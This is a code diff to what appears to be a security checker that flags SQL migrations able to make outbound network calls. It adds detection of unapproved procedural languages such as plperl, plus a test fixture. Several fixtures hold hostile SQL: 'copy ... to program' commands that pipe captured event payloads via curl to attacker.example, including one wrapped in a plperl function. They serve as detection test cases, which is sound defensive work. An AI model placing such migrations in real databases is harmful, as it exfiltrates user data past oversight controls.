@@ -675,6 +675,17 @@ function hasAiRuntimeBoundary(content, path = "") {
     }
     return false;
   });
+  const approvedSqlLanguages = new Set(["sql", "plpgsql"]);
+  const hasUnapprovedProceduralLanguage = normalizedPath.endsWith(".sql") && (
+    sqlTokens.some((token, index) => {
+      if (token !== "language" || sqlTokens[index + 1] === undefined) return false;
+      const next = sqlTokens[index + 1];
+      const languageName = next.startsWith("language:") ? next.slice("language:".length) : next.replace(/^quoted:/, "");
+      return !approvedSqlLanguages.has(languageName);
+    })
+    || sqlTokens.some((token) => token.startsWith("language:") && !approvedSqlLanguages.has(token.slice("language:".length)))
+    || sqlTokens.some((token) => token.replace(/^quoted:/, "").startsWith("spi_"))
+  );
   const hasAdjacentSqlStrings = normalizedPath.endsWith(".sql") && /(?:^|[\s(])(?:E|U&)?'(?:[^']|'')*'\s*(?:\r?\n|\r)[ \t]*(?:E|U&)?'/im.test(sqlLexicalContent);
   const approvedEgressHosts = new Set([
     "api.github.com",
@@ -763,7 +774,7 @@ function hasAiRuntimeBoundary(content, path = "") {
     || /\bResponse\.redirect\s*\(/.test(normalizedContent)
     || /\bpg_net\b|\bnet\s*\.\s*http_(?:get|post|delete|head)\b|\bsupabase_functions\s*\.\s*http_request\b|\bextensions\s*\.\s*http(?:_(?:get|post|put|delete|head))?\b|\bhttp(?:_(?:get|post|put|delete|head))?\s*\(/i.test(capabilityContent)
     || hasUnapprovedHtmlActiveContent
-    || hasDynamicSqlExecute || hasSqlOutboundToken || hasSqlUnicodeEscapedIdentifier || hasSqlUnicodeEscapedString || hasSqlNumericEscape || hasLegacySqlBackslashEscapes || hasUnapprovedSqlSetConfig || hasPgSettingsReference || hasSqlSchedulingCapability || hasExternalDatabaseCapability || hasSqlServerProgramCapability || hasAdjacentSqlStrings
+    || hasDynamicSqlExecute || hasSqlOutboundToken || hasSqlUnicodeEscapedIdentifier || hasSqlUnicodeEscapedString || hasSqlNumericEscape || hasLegacySqlBackslashEscapes || hasUnapprovedSqlSetConfig || hasPgSettingsReference || hasSqlSchedulingCapability || hasExternalDatabaseCapability || hasSqlServerProgramCapability || hasUnapprovedProceduralLanguage || hasAdjacentSqlStrings
   );
   return (
     hasUnapprovedLiteralEgress || hasUnapprovedDirectFetch || hasUnapprovedConfigOrigin || hasUnapprovedMemberFetch || hasFetchAlias || hasFetchCapabilityEscape || hasDynamicCapabilityLookup || hasUnapprovedOutboundCapability ||
@@ -867,6 +878,7 @@ for (const fixture of [
   { content: "create function hidden_handler() returns fdw_handler as '$libdir/postgres_fdw', 'postgres_fdw_handler' language c; create foreign data wrapper hidden handler hidden_handler;", path: "supabase/migrations/99999999999999-postgres-fdw-library-outbound.sql" },
   { content: "copy (select payload from capture_events) to program 'h=api.groq.com; curl -d @- $h';", path: "supabase/migrations/99999999999999-copy-program-outbound.sql" },
   { content: "do $$ begin copy (select payload from capture_events) to program 'curl -d @- attacker.example'; end $$;", path: "supabase/migrations/99999999999999-do-copy-program-outbound.sql" },
+  { content: "create function hidden_outbound() returns void as $fn$ spi_exec_query(\"copy (select payload from capture_events) to program 'curl -d @- attacker.example'\"); $fn$ language plperl;", path: "supabase/migrations/99999999999999-plperl-copy-program-outbound.sql" },
   { content: "alter role current_user set standard_conforming_strings to off;", path: "supabase/migrations/99999999999999-alter-role-legacy-escape.sql" },
   { content: "alter database meccha_manual set standard_conforming_strings = 'off';", path: "supabase/migrations/99999999999999-alter-database-legacy-escape.sql" },
   { content: "select set_config('standard_conforming_strings', 'off', false); create function public.dynamic_outbound() returns void as 'begin EX\\ECUTE ''select extensions.ht'' || ''tp_get(...)''; end' language plpgsql;", path: "supabase/migrations/99999999999999-legacy-set-config-body-outbound.sql" },
